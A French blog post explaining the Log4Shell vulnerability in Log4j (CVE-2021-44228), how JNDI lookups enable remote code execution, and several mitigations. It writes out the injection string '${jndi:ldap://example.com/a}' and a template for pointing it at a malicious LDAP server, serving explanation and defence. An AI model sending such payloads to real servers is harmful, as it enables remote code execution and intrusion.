Author: Eban
Date: 2021/12/11
Title: Log4j, une vulnérabilité d'une ampleur inédite
Summary: Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4Shell (CVE-2021-44228) a ébranlé le petit monde de la sécurité informatique, nous tacherons de comprendre son fonctionnement et comment s'en prémunir dans cet article.
Slug: log4j
Keywords: sécurité

Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) a ébranlé le monde de la sécurité informatique, nous tacherons de comprendre son fonctionnement et comment s'en prémunir dans cet article.

[Log4j2](https://github.com/apache/logging-log4j2) est une bibliothèque Java permettant de générer... des logs, c'est comme le Port-Salut, c'est écrit dessus 😉. Cette bibliothèque est extrêmement utilisé par de nombreuses entreprises, comme, pour ne citer qu'elles, Apple, Steam, Twitter, Amazon, Tesla ou encore Microsoft. Le problème est qu'une vulnérabilité a été découverte sur ce logiciel. Cette vulnérabilité était passée jusqu'alors inaperçue, le 9 décembre un utilisateur de Github, `wcc526`, interroge l'auteur d'une pull request corrigeant cette faille à propos de celle ci. S'ensuit la publication d'une CVE et d'un Proof Of Concept.

![Message de wcc526 "Is it a security vulnerability"](/static/img/log4j/github.png)

## 💥 Exploitation 

L'exploitation de cette vulnérabilité est triviale, une simple suite de caractères comme `${jndi:ldap://example.com/a}` permet d'obtenir une RCE (Remote Code Execution) sur le serveur distant.

JNDI est l'acronyme de "Java Naming and Directory Interface", c'est une fonction de Java qui permet d'interroger des directories afin d'obtenir en retour un objet java. Un directory, c'est une sorte de base de donnée principalement utilisée en entreprise qui stocke des informations comme par exemple les utilisateurs, leurs droits, etc. On peut citer ActiveDirectory ou encore [LDAP](https://fr.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol) comme exemple de directory bien connu. Java, à travers JNDI, supporte le directory bien connu LDAP. La syntaxe `jndi:ldap://example.com/a` interroge le serveur LDAP sur le serveur example.com et va télécharger l'objet a.

La syntaxe `${}`indique à Log4j qu'il faut évaluer ce qui est indiqué entre accolades. Par exemple, `${java:version}` renverra la version de java. Ici, `${jndi:ldap://example.com/a}` indique à Log4j d'évaluer (exécuter) l'objet présent à l'URI `ldap://example.com/a`.

Au vu de ces éléments, il est trivial d'obtenir une RCE sur le serveur distant. Il suffit de monter un serveur LDAP malicieux contenant un objet Java vérolé et de faire en sorte que `${jndi:ldap://SERVEUR/OBJET}` soit loggé.

Cette vulnérabilité est très inquiétante au vu de la facilité avec laquelle elle peut être exploitée. À la découverte de cette dernière, de nombreux bots ont scanné l'ensemble d'Internet à la recherche de serveur vulnérables. Le serveur qui héberge le site web que vous visitez en ce moment a été visité par certains d'entre eux.

![De nombreux bots essayent d'envoyer des payload malveillants](/static/img/log4j/vm01.png)

## 🧑‍🚒 Limiter les dégâts

Il existe plusieurs méthodes afin de mitiger cette faille de sécurité.

La première, la plus évidente, mettre à jour log4j vers la version 2.17.0 et/ou Java vers la version 8u121 (sortie début 2017). ⚠️ Les versions 2.15 et 2.16 sont respectivement vulnérables à une RCE et un attaque DOS ces versions ne sont donc pas à considérer comme sécurisées.    



La seconde, mettre la variable `log4j2.formatMsgNoLookups` à `True`, ceci peut être fait en ajoutant l'argument `‐Dlog4j2.formatMsgNoLookups=True` à la commande permettant de lancer l'application Java. Ceci peut aussi être fait en ajoutant la variable d'environnement Linux `LOG4J_FORMAT_MSG_NO_LOOKUPS`.

La troisième, plus radicale, consiste à enlever purement et simplement la classe `JndiLookup` qui est la cause de cette vulnérabilité. Ceci peut être fait avec la commande `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class` notamment.

Une autre solution plus amusante a été mise en place par Maayan-Sela et cr-mitmit, elle s'appelle `Logout4Shell`, c'est un logiciel en Java qui permet de patcher n'importe quel serveur vulnérable. Le code est disponible [ici](https://github.com/Cybereason/Logout4Shell).

Une autre solution, préventive cette fois, qui aurait pu limiter grandement les dégâts, est de bien cloisonner ses différents services. Ceci peut être fait au moyen de [services systemd renforcés](https://ilearned.eu/systemd-sandboxing.html), ou de technologies de conteneurisation comme Docker.